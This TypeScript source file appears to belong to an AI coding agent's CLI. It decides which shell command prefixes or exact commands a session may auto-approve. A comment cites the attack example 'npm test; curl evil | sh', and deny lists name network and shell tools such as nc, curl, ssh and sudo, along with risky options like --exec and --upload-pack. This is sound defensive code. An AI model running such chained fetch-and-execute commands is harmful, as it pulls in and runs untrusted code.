/**
 * Session-scoped approval of simple shell command prefixes. Kept dependency-free so the CLI can
 * import it without loading the tool registry.
 *
 * Approving the prefix "npm test" lets later commands that start with exactly those words run
 * without a prompt. Extra arguments are allowed only while they stay harmless: anything that
 * points outside the workspace or switches a command into "write a file / run a program" mode
 * still asks.
 */
import type { RiskClass } from './risk.js';

// Anything that can chain, substitute, redirect or group commands disqualifies a command from
// prefix approval: "npm test; curl evil | sh" must never ride on an approved "npm test".
const SHELL_META_RE = /[;&|`$<>(){}\\\n\r]/;
const LAUNCHER_SUBCOMMANDS = new Set(['run', 'exec', 'x', 'dlx', '-m']);
// Commands that run other commands or rewrite their environment: never approvable by prefix.
const ALWAYS_EXPLICIT = new Set([
  'env', 'sudo', 'doas', 'su', 'xargs', 'eval', 'exec', 'command', 'builtin', 'source', '.', 'nohup',
  'time', 'nice', 'timeout', 'watch', 'ssh', 'find', 'bash', 'sh', 'zsh', 'fish', 'dash', 'pwsh', 'powershell',
]);
// Interpreters may be approved for a specific script/module ("python -m pytest", "node build.js"),
// never as a bare single-word prefix that would cover any flag combination.
const INTERPRETERS = new Set(['python', 'python3', 'node', 'deno', 'bun', 'ruby', 'perl', 'php', 'awk', 'sed', 'git']);
// Commands whose arguments decide everything (what gets deleted, moved, downloaded, killed):
// only the exact same command line is remembered.
const EXACT_ONLY = new Set([
  'rm', 'rmdir', 'mv', 'cp', 'ln', 'chmod', 'chown', 'chgrp', 'dd', 'truncate', 'shred', 'mkfs',
  'curl', 'wget', 'scp', 'rsync', 'nc', 'ncat', 'kill', 'pkill', 'killall', 'docker', 'podman', 'kubectl',
]);
// Installing packages runs third-party install scripts: "npm install lodash" must not also cover
// "npm install some-other-package".
const PACKAGE_MANAGERS = new Set(['npm', 'pnpm', 'yarn', 'bun', 'pip', 'pip3', 'uv', 'poetry', 'cargo', 'go', 'gem', 'composer', 'apt', 'apt-get', 'pkg', 'brew', 'dnf', 'pacman']);
const INSTALL_SUBCOMMANDS = new Set(['install', 'i', 'add', 'ci', 'update', 'upgrade', 'up', 'get', 'remove', 'rm', 'uninstall', 'un', 'sync']);
// Options that make an otherwise read-only command write files, load config or run programs
// (git diff --output=..., git diff --ext-diff, git -c core.pager=..., --exec, --upload-pack ...).
const RISKY_OPTION_RE = /^--?(?:o|output|out|outfile|out-file|outdir|out-dir|output-dir|exec|ext-diff|upload-pack|receive-pack|config|c|eval|e|command|shell|pager|editor|global|prefix|target-dir|init-file|rcfile|require|r|import|loader)(?:=|$)/i;

function commandTokens(input: unknown): string[] | undefined {
  const command = input && typeof input === 'object' ? (input as { command?: unknown }).command : undefined;
  if (typeof command !== 'string') return undefined;
  const trimmed = command.trim();
  if (!trimmed || SHELL_META_RE.test(trimmed) || /["']/.test(trimmed)) return undefined;
  return trimmed.split(/\s+/);
}

/** An argument that names something outside the workspace (absolute, home-relative or `..`). */
function leavesWorkspace(token: string): boolean {
  const value = token.includes('=') ? token.slice(token.indexOf('=') + 1) : token;
  return /^(?:\/|~|[A-Za-z]:[\\/]|\\\\)/.test(value) || /(?:^|[\\/])\.\.(?:[\\/]|$)/.test(value);
}

/** Executable name without directory or Windows executable suffix (curl.exe → curl). */
function commandName(token: string): string {
  return (token.replace(/\\/g, '/').split('/').pop() ?? token)
    .toLowerCase()
    .replace(/\.(?:exe|cmd|bat|com)$/, '');
}

/**
 * Build the prefix that "always allow" may remember for a bash command. Launchers get a short
 * prefix; interpreters and commands with risky options return undefined, meaning they always need
 * a fresh decision. File-mutating, network and package-install commands return the whole command
 * line, so only that exact command is remembered.
 */
export function bashApprovalPrefix(input: unknown): string | undefined {
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=')) return undefined;
  const name = commandName(tokens[0]);
  if (ALWAYS_EXPLICIT.has(name)) return undefined;
  if (tokens.some(leavesWorkspace)) return undefined;
  if (EXACT_ONLY.has(name) || (PACKAGE_MANAGERS.has(name) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''))) {
    return tokens.join(' ');
  }
  const take = tokens.length > 2 && LAUNCHER_SUBCOMMANDS.has(tokens[1]) ? 3 : tokens.length > 1 && !tokens[1].startsWith('-') ? 2 : 1;
  if (take === 1 && INTERPRETERS.has(name)) return undefined;
  return tokens.slice(0, take).join(' ');
}

/**
 * Auto mode never approves high or critical risk. Critical is denied earlier by the tool registry;
 * this predicate is the single source of truth used by the CLI approval closure.
 */
export function canAutoApprove(mode: string, risk: RiskClass): boolean {
  return mode === 'auto' && risk !== 'high' && risk !== 'critical';
}

/**
 * An exact, session-scoped allowlist entry for one simple command. Restricted to plain commands
 * (no quoting or shell metacharacters) so whitespace normalization can never widen the approved
 * command into a different one.
 */
export function bashApprovalExact(input: unknown): string | undefined {
  const command = input && typeof input === 'object' ? (input as { command?: unknown }).command : undefined;
  if (typeof command !== 'string') return undefined;
  const trimmed = command.trim();
  if (!trimmed || SHELL_META_RE.test(trimmed) || /["']/.test(trimmed)) return undefined;
  return trimmed.split(/\s+/).join(' ');
}

/** True when the command is byte-for-byte (after whitespace collapse) an approved exact command. */
export function isApprovedBashExact(input: unknown, exactCommands: ReadonlySet<string>): boolean {
  if (!exactCommands.size) return false;
  const normalized = bashApprovalExact(input);
  return normalized !== undefined && exactCommands.has(normalized);
}

/**
 * True when the command is a simple command that starts, token by token, with an approved prefix
 * and whose extra arguments neither leave the workspace nor use a risky option.
 */
export function isApprovedBashPrefix(input: unknown, prefixes: ReadonlySet<string>): boolean {
  if (!prefixes.size) return false;
  const tokens = commandTokens(input);
  if (!tokens?.length || tokens[0].includes('=')) return false;
  const name = commandName(tokens[0]);
  if (ALWAYS_EXPLICIT.has(name)) return false;
  for (const prefix of prefixes) {
    const wanted = prefix.split(' ');
    if (wanted.length > tokens.length || !wanted.every((t, i) => tokens[i] === t)) continue;
    const extra = tokens.slice(wanted.length);
    const exactOnly = EXACT_ONLY.has(name) || (PACKAGE_MANAGERS.has(name) && INSTALL_SUBCOMMANDS.has(tokens[1] ?? ''));
    if (exactOnly && extra.length) continue;
    if (extra.some(token => leavesWorkspace(token) || RISKY_OPTION_RE.test(token))) continue;
    return true;
  }
  return false;
}
